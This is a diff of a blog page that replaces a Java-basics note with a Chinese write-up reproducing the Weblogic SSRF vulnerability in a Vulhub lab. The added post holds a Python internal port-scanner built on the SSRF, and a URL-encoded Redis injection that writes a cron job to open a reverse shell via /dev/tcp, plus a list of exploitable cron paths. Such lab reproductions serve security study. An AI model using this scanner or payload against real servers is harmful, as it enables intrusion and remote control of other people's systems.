@@ -15,20 +15,29 @@
 
 
 
-<meta name="description" content="前言 这一部分主要学习Java的语言基础">
-<meta name="keywords" content="学习笔记,Java">
+<meta name="description" content="前言 最近在看SSRF，刚好Vulhub里面有SSRF漏洞的环境，所以尝试着复现了一下。">
+<meta name="keywords" content="Vulhub,漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java学习笔记（一）--Java语言基础">
-<meta property="og:url" content="http://yoursite.com/2018/09/01/JAVA1/index.html">
+<meta property="og:title" content="Vulhub-Weblogic-SSRF漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2018/09/13/Vulhub-Weblogic-SSRF/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="前言 这一部分主要学习Java的语言基础">
+<meta property="og:description" content="前言 最近在看SSRF，刚好Vulhub里面有SSRF漏洞的环境，所以尝试着复现了一下。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/8.jpg">
-<meta property="og:updated_time" content="2018-09-03T13:23:20.363Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/21.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/9.jpg">
+<meta property="og:updated_time" content="2018-09-13T14:54:12.989Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Java学习笔记（一）--Java语言基础">
-<meta name="twitter:description" content="前言 这一部分主要学习Java的语言基础">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/8.jpg">
+<meta name="twitter:title" content="Vulhub-Weblogic-SSRF漏洞复现">
+<meta name="twitter:description" content="前言 最近在看SSRF，刚好Vulhub里面有SSRF漏洞的环境，所以尝试着复现了一下。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/21.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -60,7 +69,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Java学习笔记（一）--Java语言基础 | Double--R blog</title>
+<title>Vulhub-Weblogic-SSRF漏洞复现 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -302,11 +311,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-JAVA1" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Vulhub-Weblogic-SSRF" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/09/01/JAVA1/" class="article-date">
-      <time datetime="2018-09-01T14:54:45.000Z" itemprop="datePublished">2018-09-01</time>
+      <a href="/2018/09/13/Vulhub-Weblogic-SSRF/" class="article-date">
+      <time datetime="2018-09-13T08:54:41.000Z" itemprop="datePublished">2018-09-13</time>
 </a>
 
 
@@ -321,7 +330,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Java学习笔记（一）--Java语言基础
+      Vulhub-Weblogic-SSRF漏洞复现
     </h1>
   
 
@@ -330,7 +339,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">1,011字</span>
+			<span class="post-count">861字</span>
 		</span>
 	</span>
 	
@@ -352,7 +361,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/学习笔记/">学习笔记</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub/">Vulhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -363,104 +372,49 @@
       
           
         <p><strong>前言</strong></p>
-<p>这一部分主要学习Java的语言基础</p>
+<p>最近在看SSRF，刚好Vulhub里面有SSRF漏洞的环境，所以尝试着复现了一下。</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/8.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/21.jpg" alt=""></p>
 <a id="more"></a>
 <hr>
-<h2 id="Java主类结构"><a href="#Java主类结构" class="headerlink" title="Java主类结构"></a>Java主类结构</h2><p>Java程序的基本组成单元是类，类体中又包括属性与方法。每个应用程序都必须包含一个main()方法，含有main()方法的类称为主类。</p>
-<p><strong>包声明：</strong></p>
-<p>package Number为声明该类所在的包，package为包的关键字</p>
-<p><strong>声明成员变量和局部变量：</strong></p>
-<p>通常将类的属性成为类的全局变量（成员变量），将方法中的属性称之为局部变量。全局变量生命在类体中，局部变量声明在方法体中。</p>
-<p><strong>编写主方法：</strong></p>
-<p>main()方法是类体中的主方法。public、static和void分别是main()方法的权限修饰符、静态修饰符和返回值修饰符。Java程序中的main()方法必须声明为public static void。String[] args是一个字符串类型数组，它是main()方法的参数</p>
-<p><strong>导入API类库：</strong></p>
-<p>在Java语言中可以通过import关键字导入相关的类，详细描述见API文档</p>
-<p><strong>注意：</strong></p>
-<p>Java语言严格区分大小写</p>
-<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p><strong>整数类型：</strong></p>
-<p>整数类型在Java程序中有三种表示形式：</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>连接服务器,进入目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd .../vulhub/weblogic/ssrf</span><br></pre></td></tr></table></figure>
+<p>创建镜像，启动容器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://服务器ip:7001/uddiexplorer/</code>，如果是以下界面说明环境搭建成功</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/1.jpg" alt=""></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>已知存在漏洞的文件是SearchPublicRegistries.jsp，界面如下：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/2.jpg" alt=""></p>
+<p>我们随便输入一些数据，看一下它表单的参数：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/3.jpg" alt=""></p>
+<p>可以看到operator参数的数据是一个Url，这就是我们的利用点。我们再试了一下用Get提交相应的参数也是可以的，那么下面我们就用这个做一下端口检测。我们构造这样一个请求：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/4.jpg" alt=""></p>
+<p>当端口不存在时，它会返回这样的信息：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/5.jpg" alt=""></p>
+<p>可访问的端口会返回下面的信息：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/6.jpg" alt=""></p>
+<p>我们可以根据这些区别写一个端口探测脚本，dockers环境的网段一般都是172.*，端口探测脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># 'SSRF 扫描内网IP开放端口'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        final_ip = <span class="string">'&#123;ip&#125;.&#123;i&#125;'</span>.format(ip=ip,i=i)</span><br><span class="line">        <span class="keyword">print</span> final_ip</span><br><span class="line">        thread.start_new_thread(scan,(final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(final_ip)</span>:</span></span><br><span class="line">    ports = (<span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'53'</span>, <span class="string">'80'</span>, <span class="string">'135'</span>, <span class="string">'139'</span>, <span class="string">'443'</span>, <span class="string">'445'</span>, <span class="string">'1080'</span>, <span class="string">'1433'</span>, <span class="string">'1521'</span>, <span class="string">'3306'</span>, <span class="string">'3389'</span>, <span class="string">'4899'</span>, <span class="string">'8080'</span>, <span class="string">'7001'</span>, <span class="string">'8000'</span>,<span class="string">'6389'</span>,<span class="string">'6379'</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = args.url+<span class="string">'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> % (final_ip,port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(vul_url,timeout=<span class="number">15</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">            result1 = re.findall(<span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span>,r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">'but could not connect'</span>, r.content)</span><br><span class="line">            result3 = re.findall(<span class="string">'No route to host'</span>, r.content)  <span class="comment">#bugfix:此处进行优化，防止抛出no route to host类型错误</span></span><br><span class="line">            <span class="keyword">if</span> len(result1) != <span class="number">0</span> <span class="keyword">and</span> len(result2) == <span class="number">0</span> <span class="keyword">and</span> len(result3) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[!]'</span>+final_ip + <span class="string">':'</span> + port</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Weblogic SSRF vulnerable exploit'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>, dest=<span class="string">'url'</span>, required=<span class="keyword">True</span>, help=<span class="string">'Target url'</span>)</span><br><span class="line">    <span class="comment"># parser.add_argument('--ip', dest='scan_ip', help='IP to scan')</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="comment"># ip = '.'.join(args.scan_ip.split('.')[:-1])</span></span><br><span class="line">    ip = <span class="string">"172.19.0"</span>   <span class="comment">#这里diy了一下，用来探测172.19.0网段中各组件的开放的端口，试图找出redis位置。ps:我也探测过172.18.0网段，但其中并没有开启6379的。</span></span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        <span class="keyword">print</span> ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no ip"</span></span><br></pre></td></tr></table></figure>
+<p>探测结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/7.jpg" alt=""></p>
+<p>在172.19.0.2:6379端口运行了redis服务，所以后面的利用也变得简单了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>既然运行了redis服务，那么我们就可以利用redis反弹shell，发送三条redis命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOURIP%2FYOURPOSRT%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
+<p>明文：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可进行利用的cron有如下几个地方：\</p>
 <ul>
-<li>十进制：不能以0作为十进制的开头（0除外）</li>
-<li>八进制：八进制必须一0开头</li>
-<li>十六进制：十六进制必须以0X或0x开头</li>
+<li>/etc/crontab 这个是肯定的\</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件\</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
 </ul>
-<p>整数数据根据它所占内存大小的不同，可分为byte、short、int和long四种：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">数据类型</th>
-<th style="text-align:center">内存空间</th>
-<th style="text-align:center">取值范围</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">byte</td>
-<td style="text-align:center">8位</td>
-<td style="text-align:center">-128~127</td>
-</tr>
-<tr>
-<td style="text-align:center">short</td>
-<td style="text-align:center">16位</td>
-<td style="text-align:center">-32768~32767</td>
-</tr>
-<tr>
-<td style="text-align:center">int</td>
-<td style="text-align:center">32位</td>
-<td style="text-align:center">-2148483648~2148483647</td>
-</tr>
-<tr>
-<td style="text-align:center">long</td>
-<td style="text-align:center">64位</td>
-<td style="text-align:center">-9.22E18~9.22E18</td>
-</tr>
-</tbody>
-</table>
-<p>对于long型值，若复制个的值大于int类型的最大值或最小值，则需要在数字后加L或l，表示改数值为长整型</p>
-<p><strong>浮点类型：</strong></p>
-<p>Java语言中浮点类型分为单精度浮点类型和双精度浮点类型：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">数据类型</th>
-<th style="text-align:center">内存空间</th>
-<th style="text-align:center">取值范围</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">float</td>
-<td style="text-align:center">32位</td>
-<td style="text-align:center">1.4E-45~3.4028235E38</td>
-</tr>
-<tr>
-<td style="text-align:center">double</td>
-<td style="text-align:center">64位</td>
-<td style="text-align:center">4.9E-324~1.79769E308</td>
-</tr>
-</tbody>
-</table>
-<p>在默认情况下小数都被看做double型，若使用float型小数，则必须在小数后面添加F或f。</p>
-<h2 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h2><p>常量通常也被称为”final变量”，声明方式：<code>final 数据类型 常量名称=值</code></p>
-<p>当定义的final变量属于“成员变量”时，必须在定义是就设定它的初值</p>
-<p>在程序中，一般会根据变量的“有效范围”将变量分为“成员变量”和“局部变量”：</p>
-<ul>
-<li>成员变量：在类体中所定义的变量称为成员变量，成员变量在整个类中都有效。成员变量又可分为静态变量和实例变量，静态变量的有效范围可以跨类，可以直接以“类名.静态变量”的方式在其他类中使用。</li>
-<li>局部变量：在类的方法中定义的变量，只在当前定义的方法中有效，局部变量可与成员变量的名字相同，此时成员变量将被隐藏，即这个成员变量在此方法中暂时失效。</li>
-</ul>
-<h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><p>从低精度数据类型向高精度数据类型转换，则永远不会溢出，并且总是成功；而把高精度数据类型向低精度数据类型转换则必然会有信息丢失，有可能失败</p>
-<p>数据类型转换可分为隐式转换和显示转换：</p>
-<p><strong>隐式类型转换：</strong></p>
-<p>从低级类型向高级类型的转换，系统将自动执行，无需任何操作，这种转换成为隐式转换。类型排序</p>
-<p><code>byte&lt;short&lt;int&lt;long&lt;float&lt;double</code></p>
-<p><strong>显式类型转换：</strong></p>
-<p>当把高精度的变量的值赋值给低精度的变量时，必须使用显示类型转换（又称强制类型转换），语法如下：</p>
-<p><code>(类型名)要转换的值</code></p>
-<p>当执行显示类型转换时可能导致精度损失。只要是Boolean类型以外其他类型之间的转换，全部都能以显示类型转换的方法达到</p>
+<p>发送请求：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/8.jpg" alt=""></p>
+<p>这样我们就写入了shell，然后我们登上自己的服务器，监听接收反弹shell的端口，就可以控制目标服务器了：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/9.jpg" alt=""></p>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28461736&auto=1&height=66"></iframe></div>
+<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33937527&auto=1&height=66"></iframe></div>
 
 
       
@@ -470,13 +424,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/09/01/JAVA1/">Java学习笔记（一）--Java语言基础</a></p>
+        <p><span>本文标题:</span><a href="/2018/09/13/Vulhub-Weblogic-SSRF/">Vulhub-Weblogic-SSRF漏洞复现</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-09-01, 22:54:45</p>
-        <p><span>最后更新:</span>2018-09-03, 21:23:20</p>
+        <p><span>发布时间:</span>2018-09-13, 16:54:41</p>
+        <p><span>最后更新:</span>2018-09-13, 22:54:12</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/09/01/JAVA1/" title="Java学习笔记（一）--Java语言基础">http://yoursite.com/2018/09/01/JAVA1/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/01/JAVA1/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/09/13/Vulhub-Weblogic-SSRF/" title="Vulhub-Weblogic-SSRF漏洞复现">http://yoursite.com/2018/09/13/Vulhub-Weblogic-SSRF/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/13/Vulhub-Weblogic-SSRF/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -488,16 +442,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/09/02/PHP-Audit-Labs-Day2/">
-                    代码审计-parse_str函数缺陷
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/09/01/DedeCMS3/">
-                    DedeCMS代码审计Day3
+                <a href="/2018/09/09/JAVA7/">
+                    Java学习笔记（七）--数字处理类
                 </a>
             </div>
         
@@ -509,7 +457,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java主类结构"><span class="toc-number">1.</span> <span class="toc-text">Java主类结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本数据类型"><span class="toc-number">2.</span> <span class="toc-text">基本数据类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#变量与常量"><span class="toc-number">3.</span> <span class="toc-text">变量与常量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据类型转换"><span class="toc-number">4.</span> <span class="toc-text">数据类型转换</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试"><span class="toc-number">2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li></ol>
         
     </div>
     <style>
@@ -545,7 +493,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Java学习笔记（一）--Java语言基础　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Vulhub-Weblogic-SSRF漏洞复现　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -565,15 +513,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/09/02/PHP-Audit-Labs-Day2/" title="上一篇: 代码审计-parse_str函数缺陷">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/09/01/DedeCMS3/" title="下一篇: DedeCMS代码审计Day3">
+            <a href="/2018/09/09/JAVA7/" title="下一篇: Java学习笔记（七）--数字处理类">
                 <i class="fa fa-angle-right"></i>
             </a>
         
